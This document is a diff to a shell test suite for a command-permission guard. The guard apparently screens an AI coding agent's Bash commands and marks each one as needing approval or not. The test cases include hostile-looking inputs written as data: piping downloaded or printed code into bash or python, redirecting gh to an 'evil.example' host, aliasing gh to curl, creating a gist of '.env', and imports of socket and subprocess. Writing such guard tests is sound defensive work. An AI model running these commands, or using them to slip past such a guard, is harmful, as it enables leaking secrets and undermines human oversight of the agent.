@@ -146,7 +146,10 @@ sh_ none 'git push https://developer.mozilla.org/x'
 sh_ ask  'gh api -X POST /repos/o/r/issues'
 sh_ ask  'gh gist create .env'
 sh_ ask  'python3 -c "import urllib.request"'
-sh_ ask  'python -Ic "x"'
+sh_ none 'python -Ic "x"'
+sh_ ask  'python -Ic "import socket"'
+sh_ ask  "python3 -c 'import os; os.system(\"x\")'"
+sh_ ask  "python3 -c 'print(\"curl x\")' | bash"
 sh_ ask  'node -e "fetch(1)"'
 sh_ ask  'npm install left-pad'
 sh_ ask  'pip install requests'
@@ -272,8 +275,10 @@ sup none 'gh api /x'
 sup ask  'gh api /x -f a=b'
 sup ask  'gh api -XPOST /x'
 sup ask  'gh api /x --input body.json'
-sup ask  'gh api graphql -F q=1'
-sup ask  'ls && gh issue create x'
+sup none 'gh api graphql -F q=1'
+sup ask  "gh api graphql -f query='mutation{x}'"
+sup ask  'gh api graphql -F query=@q.graphql'
+sup ask  'printenv && gh issue create x'
 sup ask  "bash -c 'gh issue create x'"
 sup ask  "env GH_HOST=evil.example bash -c 'gh issue create x'"
 sup ask  "find . -name x -exec bash -c 'gh issue create x' \; -exec curl https://x \;"
@@ -292,7 +297,7 @@ sup ask  'env GH_TOKEN=x gh issue create x'
 sup ask  'timeout 5 gh issue create x'
 sup ask  '/usr/local/bin/gh issue create x'
 sup ask  'find . -name x -exec gh issue create --title t \; -exec curl https://x \;'
-sup ask  'python3 -c "x"'
+sup none 'python3 -c "x"'
 sup ask  'python3 - <<EOF
 import urllib.request
 EOF'
@@ -402,7 +407,7 @@ sup ask  '{ gh issue list; }'
 sup ask  'export GH_HOST=evil.example; gh issue list'
 sup ask  'alias gh=curl; gh x'
 sup ask  'cd $HOME; gh issue list'
-sup ask  'cd ~/x; gh issue create t'
+sup ask  'cd ~u/x; gh issue create t'
 sup ask  '=curl x; gh issue create t'
 sup ask  'c?rl x; gh issue create t'
 sup ask  'gh pr merge 3 && gh issue list'
@@ -487,12 +492,12 @@ spy ask  $'python3 - <<\'ÉOF\'\nx=1\nÉOF'
 spy ask  'python3 -c "print($HOME)"'
 spy none "python3 -I -c 'x'"
 spy ask  'curl x | python3 -'
-spy ask  'python3 -c print'
-spy ask  "python3 -c 'a'\"b\""
+spy none 'python3 -c print'
+spy none "python3 -c 'a'\"b\""
 spy none "python3 -c 'x' y"
-sup ask  $'python3 - <<\'EOF\'\nx=1\nEOF'
-sup ask  "python3 -c 'print(1)'"
-PYC="$(bash_cmd "python3 -c 'print(1)'")"
+sup none $'python3 - <<\'EOF\'\nx=1\nEOF'
+sup none "python3 -c 'print(1)'"
+PYC="$(bash_cmd "python3 -c 'import socket'")"
 check ask "team role: python opt-in not honoured" "$(hook "$PYC" "$D/suppy")"
 check ask "Advisor: python opt-in not honoured" "$(role Advisor "$D/suppy" "$PYC")"
 mkdir -p "$D/suppysh/.claude"; printf '%s\n' "$GH_LOCAL" > "$D/suppysh/.claude/settings.local.json"
@@ -500,7 +505,7 @@ jq '.permissions.allow += ["Bash(python3 -)","Bash(python3 -c *)"]' .claude/sett
   > "$D/suppysh/.claude/settings.json"
 check ask "python opt-in in settings.json only: -c" "$(role Supervisor "$D/suppysh" "$PYC")"
 check ask "python opt-in in settings.json only: heredoc" \
-  "$(role Supervisor "$D/suppysh" "$(bash_cmd $'python3 - <<\'EOF\'\nprint(1)\nEOF')")"
+  "$(role Supervisor "$D/suppysh" "$(bash_cmd $'python3 - <<\'EOF\'\nimport socket\nEOF')")"
 # --- eligibility with every rule present: only the Supervisor in the main checkout
 EC="$(bash_cmd 'cd /tmp; gh issue create t | head -1')"
 check none "Supervisor compound" "$(role Supervisor "$D/sup" "$EC")"
@@ -530,6 +535,33 @@ s68 none $'python3 -I - <<\'EOF\'\nprint(1)\nEOF'
 check none "role reads gh issue list" "$(role Advisor "$D/sup268" "$(bash_cmd 'gh issue list --json number')")"
 check ask  "role still asks for a gh write" "$(role Advisor "$D/sup268" "$(bash_cmd 'gh issue create x')")"
 check ask  "role: gh list toward another host" "$(role Advisor "$D/sup268" "$(bash_cmd 'GH_HOST=evil.example gh issue list')")"
+# --- #272: inline Python judged by its code, loops anywhere, $(…) of reads, more companions
+mkdir -p "$D/sup272/.claude"; cp .claude/settings.json "$D/sup272/.claude/settings.json"
+s72() { check "$1" "Supervisor #272 $2" "$(role Supervisor "$D/sup272" "$(bash_cmd "$2")")"; }
+r72() { check "$1" "team role #272 $2" "$(hook "$(bash_cmd "$2")")"; }
+r72 none "gh pr view 1 --json body -q .body | python3 -I -c 'import json,sys; print(sys.stdin.read())'"
+r72 none $'cd "/tmp/a b"; python3 - x.md <<\'EOF\'\nimport sys\np=sys.argv[1]; s=open(p).read()\nopen(p,"w").write(s.replace("a","b"))\nEOF\ngit diff --stat'
+r72 ask  $'python3 - <<\'EOF\'\nimport subprocess\nEOF'
+r72 ask  $'python3 - <<\'EOF\' | bash\nprint("curl x")\nEOF'
+r72 ask  $'python3 - <<EOF\nprint(1)\nEOF\ncurl x'
+r72 ask  "python3 -c 'import sys; sys.path.insert(0, \".\")'"
+r72 ask  "python3 -c 'print(().__class__)'"
+r72 ask  "python3 -c 'def f():\n import socket'"
+r72 ask  'python3 -c "print($X)"'
+r72 none $'cat > /tmp/n.md <<\'EOF\'\nuse ssh and curl here\nEOF\nls'
+r72 ask  $'bash <(cat <<\'EOF\'\ncurl x\nEOF\n)'
+s72 none "cd ~/x && for n in 1 2; do gh issue view \$n --json title -q '\"#\\(.title)\"'; done 2>&1"
+s72 none "for p in 3 4; do echo \"#\$p \$(gh pr view \$p --json body -q .body | rg -io '(closes|fixes) #[0-9]+' | tr '\\n' ' ')\"; done; gh api graphql -f query='{viewer{login}}' -q .data"
+s72 none "gh project field-list 2 --owner o --format json | jq .fields; rg -n 'Closes #' .claude/lib/*.sh | head; git log --oneline -S'x' -- f | head"
+s72 none "gh pr view 1 --json state 2>&1; ls -R .agents | head; sed -n '1,20p' f; sleep 2"
+s72 ask  'for n in 1; do gh issue view $n; done | bash'
+s72 ask  'for n in 1; do gh issue close $n; done'
+s72 ask  'gh issue view "$(gh issue list -q .x)"'
+s72 ask  'sort "$(gh issue view 1 -q .body)"'
+s72 ask  "gh issue view 1; cat *.md"
+s72 ask  "gh issue view 1 *"
+r72 ask  "gh pr view 1 -q .body | python3 -c 'import socket'"
+r72 ask  "gh pr view 1 -q .body | python3 -c 'print(1)' -R h/o/r"
 # The real-command corpus (fixtures/guard-corpus.txt): every row keeps its verdict.
 while IFS='|' read -r want cmd; do
   case "$want" in ask|none) check "$want" "corpus: $cmd" "$(role Supervisor "$D/sup268" "$(bash_cmd "$cmd")")" ;; esac
